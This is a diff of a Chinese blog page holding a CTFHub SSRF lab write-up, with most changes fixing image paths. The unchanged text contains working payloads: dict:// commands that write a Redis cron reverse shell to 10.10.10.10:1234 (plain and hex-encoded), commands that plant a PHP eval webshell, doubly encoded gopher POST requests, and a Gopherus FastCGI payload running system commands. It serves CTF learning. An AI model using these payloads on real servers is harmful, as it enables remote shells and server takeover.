@@ -102,7 +102,8 @@
 <p>在ctfhub上练习和学习了ssrf</p>
 <h2 id="第一部分"><a href="#第一部分" class="headerlink" title="第一部分"></a>第一部分</h2><h4 id="【1】内网访问"><a href="#【1】内网访问" class="headerlink" title="【1】内网访问"></a>【1】内网访问</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=127.0.0.1/flag.php</span><br></pre></td></tr></table></figure>
 
-<p><img src="/.io//image-20250404161254343.png" alt="image-20250404161254343"></p>
+
+
 <h4 id="【2】伪协议读取文件"><a href="#【2】伪协议读取文件" class="headerlink" title="【2】伪协议读取文件"></a>【2】伪协议读取文件</h4><p>SSRF利用的协议</p>
 <p>（1）file：在有回显的情况下，利用 file 协议可以读取任意内容</p>
 <p>访问文件系统总而获取文件，就是读取服务器本地文件，访问本地的静态资源</p>
@@ -111,12 +112,22 @@
 <p>获取服务器本机的redis信息。字典服务器协议，访问字典资源，能够引用允许通过DICT协议使用的定义或单词列表。如，dict:&#x2F;&#x2F;&#x2F;ip:6739&#x2F;info：</p>
 <p>（3）gopher：gopher支持发出GET、POST请求：可以先截获get请求包和post请求包，再构造成符合gopher协议的请求。gopher协议是ssrf利用中一个最强大的协议(俗称万能协议)。可用于反弹shell</p>
 <p>（4）http&#x2F;s：探测内网主机存活</p>
-<p><img src="/.io//image-20250404161324145.png" alt="image-20250404161324145"></p>
+<img src="/.io//03/31/ssrf/image-20250404161324145.png" class title="image-20250404161324145">
+
 <p>访问源码</p>
-<p><img src="/.io//image-20250404161352756.png" alt="image-20250404161352756"></p>
+<img src="/.io//03/31/ssrf/image-20250404161352756.png" class title="image-20250404161352756">
+
+
+
+
+
 <h4 id="【3】端口扫描"><a href="#【3】端口扫描" class="headerlink" title="【3】端口扫描"></a>【3】端口扫描</h4><p>1，有提示端口在8000~9000这个范围，所以尝试爆破</p>
-<p><img src="/.io//image-20250404161412815.png" alt="image-20250404161412815"></p>
-<p><img src="/.io//image-20250404161429536.png"></p>
+<img src="/.io//03/31/ssrf/image-20250404161412815.png" class title="image-20250404161412815">
+
+
+
+<img src="/.io//03/31/ssrf/image-20250404161429536.png" class>
+
 <p>2，直接访问，就能够得到flag</p>
 <p><code>知识点补充</code></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">#### `\dic://协议数据格式 ：\`</span><br><span class="line"></span><br><span class="line">`一、dict协议探测端口和服务指纹`</span><br><span class="line"></span><br><span class="line">`dict://127.0.0.1:22`</span><br><span class="line"></span><br><span class="line">`dict://172.22.10.10:3306`</span><br><span class="line"></span><br><span class="line">`dict://127.0.0.1:6379/info`</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">`二、dict协议攻击redis，写入定时任务，进行反弹shell`</span><br><span class="line"></span><br><span class="line">`centos系统定时任务的路径为：/var/spool/cron`</span><br><span class="line"></span><br><span class="line">`debian系统定时任务的路径为：/var/spool/cron/crontabs`</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">`dict://127.0.0.1:6379/config:set:dbfilename:root`</span><br><span class="line"></span><br><span class="line">`dict://127.0.0.1:6379/config:set:dir:/var/spool/cron`</span><br><span class="line"></span><br><span class="line">`dict://127.0.0.1:6379/set:test:&quot;\n\n/1     /bin/bash -i &gt;&amp; /dev/tcp/10.10.10.10/1234 0&gt;&amp;1\n\n&quot;`</span><br><span class="line"></span><br><span class="line">`dict://127.0.0.1:6379/save`</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">`注意：若payload存在被转义或过滤的情况，可利用16进制写入内容`</span><br><span class="line"></span><br><span class="line">`dict://127.0.0.1:6379/set:test:&quot;\n\n\x2a/1\x20\x2a\x20\x2a\x20\x2a\x20\x2a\x20/bin/bash\x20\x2di\x20\x3e\x26\x20/dev/tcp/10.10.10.10/1234\x200\x3e\x261\n\n&quot;`</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">`三、dict协议攻击redis，写入webshell`</span><br><span class="line"></span><br><span class="line">`dict://127.0.0.1:6379/config:set:dbfilename:test.php`</span><br><span class="line"></span><br><span class="line">`dict://127.0.0.1:6379/config:set:dir:/var/www/html`</span><br><span class="line"></span><br><span class="line">`dict://127.0.0.1:6379/set:test:&quot;\n\n&lt;?php @eval($_POST[x]);?&gt;\n\n&quot;`</span><br><span class="line"></span><br><span class="line">`dict://127.0.0.1:6379/save`</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">`若存在过滤， 则利用16进制内容写入：`</span><br><span class="line"></span><br><span class="line">`dict://127.0.0.1:6379/set:test:&quot;\n\n\x3c\x3f\x70\x68\x70\x20\x40\x65\x76\x61\x6c\x28\x24\x5f\x50\x4f\x53\x54\x5b\x78\x5d\x29\x3b\x3f\x3e\n\n&quot;`</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">四、dict协议攻击redis，写入ssh公钥</span><br><span class="line"></span><br><span class="line">操作和写入定时任务相似`</span><br></pre></td></tr></table></figure>
@@ -131,7 +142,8 @@
 <p>例子：请求 Gopher 服务器上的 &#x2F;example&#x2F;file.txt 文本文件，可以使用以下 URL 格式：</p>
 <p>gopher:&#x2F;&#x2F;example.com:端口&#x2F;example&#x2F;file.txt</p>
 <p>3，在gopher协议中发送HTTP的数据的步骤：\构造HTTP数据包URL编码、替换回车换行为\%0d%0a\、发送gopher协议\</p>
-<h5 id><a href="#" class="headerlink" title></a><img src="/.io//image-20250404161531362.png" alt="image-20250404161531362"></h5><h6 id="4，-gopher的GET请求"><a href="#4，-gopher的GET请求" class="headerlink" title="4，\gopher的GET请求\"></a>4，\gopher的GET请求\</h6><p><img src="/.io//image-20250404161550689.png" alt="image-20250404161550689"></p>
+<h5 id><a href="#" class="headerlink" title></a><img src="/.io//03/31/ssrf/image-20250404161531362.png" class title="image-20250404161531362"></h5><h6 id="4，-gopher的GET请求"><a href="#4，-gopher的GET请求" class="headerlink" title="4，\gopher的GET请求\"></a>4，\gopher的GET请求\</h6><img src="/.io//03/31/ssrf/image-20250404161550689.png" class title="image-20250404161550689">
+
 <p>例子：</p>
 <p>GET &#x2F;testg.php?name&#x3D;xxx HTTP&#x2F;1.1</p>
 <p>Host: 10.211.55.2</p>
@@ -147,9 +159,11 @@
 </ol>
 <h4 id="【1】POST请求"><a href="#【1】POST请求" class="headerlink" title="【1】POST请求"></a>【1】POST请求</h4><p>1,试试访问?url&#x3D;127.0.0.1&#x2F;flag.php</p>
 <p>查看源码</p>
-<p><img src="/.io//image-20250404161611372.png" alt="image-20250404161611372">2，用file协议查看文件?url&#x3D;file:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php</p>
+<img src="/.io//03/31/ssrf/image-20250404161611372.png" class title="image-20250404161611372">2，用file协议查看文件?url=file:///var/www/html/flag.php
+
 <p>查看源码</p>
-<p><img src="/.io//image-20250404161629998.png" alt="image-20250404161629998">3，构造post请求</p>
+<img src="/.io//03/31/ssrf/image-20250404161629998.png" class title="image-20250404161629998">3，构造post请求
+
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">gopher://127.0.0.1:80/_POST /flag.php HTTP/1.1</span><br><span class="line"></span><br><span class="line">Host: 127.0.0.1:80</span><br><span class="line"></span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">Content-Length: 36</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">key= 35f3958138b5a9da466bd0a976db21b8</span><br></pre></td></tr></table></figure>
 
 <h4 id="注意：-1"><a href="#注意：-1" class="headerlink" title="注意："></a>注意：</h4><ol start="5">
@@ -163,10 +177,12 @@
 <p>第一次编码后记得修改</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher://127.0.0.1:80/_POST%20/flag.php%20HTTP/1.1%0d%0AHost:%20127.0.0.1:80%0d%0AContent-Type:%20application/x-www-form-urlencoded%0d%0AContent-Length:%2036%0d%0A%20%0Akey=35f3958138b5a9da466bd0a976db21b8%0d%0a</span><br></pre></td></tr></table></figure>
 
-<p><img src="/.io//image-20250404161656776.png" alt="image-20250404161656776">进行第2次编码</p>
+<img src="/.io//03/31/ssrf/image-20250404161656776.png" class title="image-20250404161656776">进行第2次编码
+
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher://127.0.0.1:80/_POST%2520/flag.php%2520HTTP/1.1%250d%250AHost:%2520127.0.0.1:80%250d%250AContent-Type:%2520application/x-www-form-urlencoded%250d%250AContent-Length:%252036%250d%250A%250d%250Akey=35f3958138b5a9da466bd0a976db21b8%250d%250a</span><br></pre></td></tr></table></figure>
 
-<p><img src="/.io//image-20250404161714957.png" alt="image-20250404161714957"></p>
+<img src="/.io//03/31/ssrf/image-20250404161714957.png" class title="image-20250404161714957">
+
 <p>访问得到flag</p>
 <h4 id="【2】上传文件"><a href="#【2】上传文件" class="headerlink" title="【2】上传文件"></a>【2】上传文件</h4><p><a target="_blank" rel="noopener" href="http://challenge-1d2d783de061a7da.sandbox.ctfhub.com:10800/?url=_">challenge-1d2d783de061a7da.sandbox.ctfhub.com:10800&#x2F;?url&#x3D;_</a></p>
 <p>按之前的题目同样访问一遍</p>
@@ -178,9 +194,11 @@
 <p>1，\在from表单里提交按钮\</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\&lt;input type=&quot;submit&quot; name=&quot;submit&quot;&gt;\</span><br></pre></td></tr></table></figure>
 
-<p><img src="/.io//image-20250404161743029.png" alt="image-20250404161743029"></p>
+<img src="/.io//03/31/ssrf/image-20250404161743029.png" class title="image-20250404161743029">
+
 <p>\2，用bp捕获，构造post请求\</p>
-<p><img src="/.io//image-20250404161758856.png" alt="image-20250404161758856"></p>
+<img src="/.io//03/31/ssrf/image-20250404161758856.png" class title="image-20250404161758856">
+
 <p>\我直接全部复制放在线工具里了\</p>
 <p>\2次url编码\</p>
 <p>\注意把%0A全部变成%0D%0A，得到\</p>
@@ -192,7 +210,10 @@
 <p>fastcgi协议是服务器中间件和某个语言后端进行数据交换的协议</p>
 <p>数据包(TCP流)–&gt;Nginx(中间件）–&gt;FPM(fastcgi协议解析器)–&gt;FPM按照fastcgi的协议将TCP流解析成真正的数据</p>
 <p>1，用Gopherus脚本（构造特定的Gopher协议数据包）</p>
-<p>![kali p-2025-03-26-21-14-28](ssrf&#x2F;kali p-2025-03-26-21-14-28-1743755121643-2.png)</p>
+<img src="/.io//03/31/ssrf/kali%20p-2025-03-26-21-14-28-1743755121643-2.png" class title="kali p-2025-03-26-21-14-28">
+
+
+
 <p>![](C:\Users\27866\Desktop\kali p-2025-03-26-20-43-50.png</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher://127.0.0.1:9000/_%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%00%F6%06%00%0F%10SERVER_SOFTWAREgo%20/%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP/1.1%0E%02CONTENT_LENGTH59%0E%04REQUEST_METHODPOST%09KPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Aauto_prepend_file%20%3D%20php%3A//input%0F%09SCRIPT_FILENAMEindex.php%0D%01DOCUMENT_ROOT/%00%00%00%00%00%00%01%04%00%01%00%00%00%00%01%05%00%01%00%3B%04%00%3C%3Fphp%20system%28%27cat%20/f%2A%27%29%3Bdie%28%27-----Made-by-SpyD3r-----%0A%27%29%3B%3F%3E%00%00%00%00</span><br></pre></td></tr></table></figure>
 
